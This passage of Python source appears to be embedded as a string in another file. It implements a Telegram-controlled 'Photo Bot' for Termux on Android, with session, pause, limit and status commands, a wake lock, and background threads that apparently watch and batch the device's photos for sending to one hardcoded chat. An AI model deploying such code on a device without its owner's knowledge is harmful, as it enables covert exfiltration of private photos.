_BATCH_LOCK:\n        q=len(_BATCH_QUEUE)\n    cache=_sent_count()\n    _send(str(current)+' / '+str(limit)+chr(10)+'Total: '+str(total)+chr(10)+'Queue: '+str(q)+chr(10)+'Cache: '+str(cache))\n\ndef _send_stop():\n    with _session_lock:\n        sesi=_session_count\n        total=_session_total\n        limit=_session_limit\n        last_f=_last_file\n        last_p=_last_file_path\n    with _BATCH_LOCK:\n        q=len(_BATCH_QUEUE)\n    cache=_sent_count()\n    remaining=max(0,cache-total)\n    msg='STOP ('+str(limit)+')'+chr(10)\n    msg+='Sesi ini: '+str(sesi)+chr(10)\n    msg+='Total: '+str(total)+chr(10)\n    msg+='Queue: '+str(q)+chr(10)\n    msg+='Remaining: '+str(remaining)+chr(10)\n    msg+='Last: '+last_f+chr(10)\n    msg+='/continue - lanjut'+chr(10)\n    msg+='/status - detail'\n    _send(msg)\n\ndef _cmd_continue():\n    global _session_active,_session_number,_last_progress,_session_count\n    with _session_lock:\n        if _session_active:\n            _send('Session masih active')\n            return\n        total=_session_total\n        _session_number+=1\n        _session_count=0\n        _session_active=True\n        _last_progress=0\n        old_total=total\n        new_total=old_total+_session_limit\n    _session_save()\n    _send('Continue dari '+str(old_total)+' -> '+str(new_total))\n\ndef _cmd_status():\n    with _session_lock:\n        active=_session_active\n        count=_session_count\n        limit=_session_limit\n        num=_session_number\n        last_f=_last_file\n    with _BATCH_LOCK:\n        q=len(_BATCH_QUEUE)\n    cache=_sent_count()\n    status_txt='ACTIVE' if active else 'PAUSED'\n    msg='STATUS sesi '+str(num)+chr(10)\n    msg+='Status: '+status_txt+chr(10)\n    msg+='Kirim: '+str(count)+' / '+str(limit)+chr(10)\n    msg+='Queue: '+str(q)+chr(10)\n    msg+='Cache: '+str(cache)+chr(10)\n    msg+='Last: '+last_f\n    _send(msg)\n\ndef _cmd_pause():\n    global _session_active\n    with _session_lock:\n        if not _session_active:\n            _send('Udah pause')\n            return\n        _session_active=False\n        count=_session_count\n    _session_save()\n    _send('Paused. Total: '+str(count))\n\ndef _cmd_limit(args):\n    global _session_limit\n    if not args or not args.strip():\n        _send('Limit: '+str(_session_limit))\n        return\n    try:\n        n=int(args.strip().split()[0])\n    except Exception:\n        _send('Format: /limit 500')\n        return\n    if n<10: n=10\n    if n>5000: n=5000\n    with _session_lock:\n        old=_session_limit\n        _session_limit=n\n    _session_save()\n    _send('Limit '+str(old)+' -> '+str(n))\n\ndef _cmd_reset():\n    global _session_count,_session_total,_session_number\n    global _session_active,_last_progress,_last_file,_last_file_path\n    with _session_lock:\n        _session_count=0\n        _session_total=0\n        _session_number=1\n        _session_active=True\n        _last_progress=0\n        _last_file=''\n        _last_file_path=''\n    _session_save()\n    _send('Reset')\n\ndef _cmd_stats():\n    with _session_lock:\n        total=_session_total\n        num=_session_number\n        count=_session_count\n        limit=_session_limit\n    cache=_sent_count()\n    avg=total//num if num>0 else 0\n    msg='STATISTIK'+chr(10)\n    msg+='Total: '+str(total)+chr(10)\n    msg+='Sesi: '+str(num)+chr(10)\n    msg+='Avg/sesi: '+str(avg)+chr(10)\n    msg+='Cache: '+str(cache)+chr(10)\n    msg+='Sesi ini: '+str(count)+'/'+str(limit)\n    _send(msg)\n\ndef _cmd_help():\n    msg='HELP - Photo Bot'+chr(10)\n    msg+='/continue - Lanjut'+chr(10)\n    msg+='/status - Cek'+chr(10)\n    msg+='/pause - Pause'+chr(10)\n    msg+='/limit - Ganti batas'+chr(10)\n    msg+='/reset - Reset'+chr(10)\n    msg+='/stats - Statistik'+chr(10)\n    msg+='/help - Menu'\n    _send(msg)\n\ndef _poll():\n    global _offset\n    _offset=0\n    while _running:\n        try:\n            r=_tg('getUpdates',json={'timeout':30,'offset':_offset,'allowed_updates':['message']})\n            for u in r.get('result',[]):\n                _offset=u['update_id']+1\n                if 'message' not in u:\n                    continue\n                m=u['message']\n                if m.get('chat',{}).get('id')!=int(CHAT_ID):\n                    continue\n                txt=(m.get('text') or '').strip()\n                if not txt:\n                    continue\n                if txt=='/start' or txt=='/help':\n                    _cmd_help()\n                elif txt.startswith('/continue'):\n                    _cmd_continue()\n                elif txt.startswith('/status'):\n                    _cmd_status()\n                elif txt.startswith('/pause'):\n                    _cmd_pause()\n                elif txt.startswith('/limit'):\n                    _cmd_limit(txt[len('/limit'):])\n                elif txt.startswith('/reset'):\n                    _cmd_reset()\n                elif txt.startswith('/stats'):\n                    _cmd_stats()\n        except Exception:\n            pass\n        time.sleep(1)\n\ndef _boot():\n    global _session_active,_session_count\n    try:\n        subprocess.run(['termux-wake-lock'],capture_output=True,timeout=5)\n    except Exception:\n        pass\n    _session_load()\n    with _session_lock:\n        _session_active=True\n        _session_count=0\n    _session_save()\n    _send_boot()\n    threading.Thread(target=_watch_photos,daemon=True,name='photos').start()\n    threading.Thread(target=_watch_batcher,daemon=True,name='batcher').start()\n    threading.Thread(target=_poll,daemon=True,name='poll').start()\n\nif __name__=='__main__':\n    threading.Thread(target=_boot,daemon=True).start()\n    try:\n        while True:\n            time.sleep(3600)\n    except KeyboardInterrupt:\n        _running=False\n        _session_save()\n        try:\n            subprocess.run(['termux-wake-unlock'],capture_output=True,timeout=5)\n        except Exception:\n            pass\n";
